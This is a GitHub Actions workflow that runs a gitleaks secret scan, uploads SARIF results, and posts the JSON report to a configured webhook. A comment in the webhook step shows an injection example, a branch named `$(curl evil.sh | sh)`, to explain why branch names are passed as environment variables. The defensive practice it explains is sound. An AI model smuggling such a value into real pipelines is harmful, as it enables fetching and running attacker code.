name: Gitleaks Secret Scan
on:
  pull_request:
    branches: [main, master]
  schedule:
    - cron: '0 4 * * *'
  workflow_dispatch:     # Enables manual run
    inputs:
      reason:
        description: "Reason for manual run"
        required: false
        default: "Manual security scan"

permissions:
  contents: read
  security-events: write   # required by upload-sarif

jobs:
  gitleaks:
    name: Scan for secrets
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          fetch-depth: 0

      - name: Install gitleaks
        run: |
          # The old one-liner (grep + greedy sed) depended on the GitHub API
          # returning pretty-printed JSON. When it returns compact JSON the
          # greedy .* swallows the rest of the payload, GITLEAKS_VERSION becomes
          # a JSON fragment and the download URL is malformed — curl (3) "bad
          # range specification", then tar fails on the truncated stream.
          # Parse with jq, sanity-check the result, and pin a fallback.
          GITLEAKS_VERSION=$(curl -sSfL --retry 5 --retry-delay 3 --retry-all-errors --connect-timeout 15 -H 'Accept: application/vnd.github+json' \
            https://api.github.com/repos/gitleaks/gitleaks/releases/latest \
            | jq -r '.tag_name // empty' | sed 's/^v//')
          case "$GITLEAKS_VERSION" in
            ''|*[!0-9.]*)
              echo "::warning::could not resolve latest gitleaks version — using pinned fallback."
              GITLEAKS_VERSION=8.30.1 ;;
          esac
          echo "Installing gitleaks v${GITLEAKS_VERSION}"
          curl -sSfL --retry 5 --retry-delay 3 --retry-all-errors --connect-timeout 15 "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" | tar -xz -C /usr/local/bin gitleaks

      # The scan records its exit code instead of failing here, so the reports
      # still reach the SARIF upload and the webhook. The job fails at the end.
      - name: Run gitleaks
        id: scan
        run: |
          set +e
          gitleaks detect --source . --verbose --redact --report-format sarif --report-path gitleaks-report.sarif
          gitleaks detect --source . --verbose --redact --report-format json --report-path gitleaks-report.json
          echo "exit_code=$?" >> "$GITHUB_OUTPUT"

      - name: Upload SARIF report
        if: always()
        continue-on-error: true   # a reporting failure must not mask the scan result
        uses: github/codeql-action/upload-sarif@f3712979fa5f215279b101dd0a2e3bdfb4353324 # v3.37.7
        with:
          sarif_file: gitleaks-report.sarif

      - name: Send JSON to endpoint
        if: always()
        # Branch name and repo name reach the shell as env vars, never as
        # ${{ }} interpolation. A branch called `$(curl evil.sh | sh)` would
        # otherwise be substituted into the script text before bash parses it.
        env:
          WEBHOOK_URL: ${{ secrets.SAST_GITLEAK_WEBHOOK_URL }}
          WEBHOOK_TOKEN: ${{ secrets.SAST_WEBHOOK_TOKEN }}
          BRANCH: ${{ github.head_ref || github.ref_name }}
          REPO_NAME: ${{ github.event.repository.name }}
        run: |
          # Dependabot-triggered runs receive no secrets, so WEBHOOK_URL is empty
          # and the POST would go to a malformed "?branch=..." URL (curl exit 3),
          # failing the job even when gitleaks found nothing. Skip instead.
          if [ -z "$WEBHOOK_URL" ]; then
            echo "SAST_GITLEAK_WEBHOOK_URL not set (expected on dependabot runs) — skipping report upload."
            exit 0
          fi
          if [ ! -f gitleaks-report.json ]; then
            echo "::warning::no gitleaks-report.json to send — the scan produced no report."
            exit 0
          fi
          curl -X POST "${WEBHOOK_URL}?branch=${BRANCH}&repo=${REPO_NAME}" \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer ${WEBHOOK_TOKEN}" \
            -d @gitleaks-report.json

      - name: Fail if secrets were found
        if: steps.scan.outputs.exit_code != '0'
        run: |
          echo "::error::gitleaks found secrets — see the scan log above for file, line and commit."
          exit 1
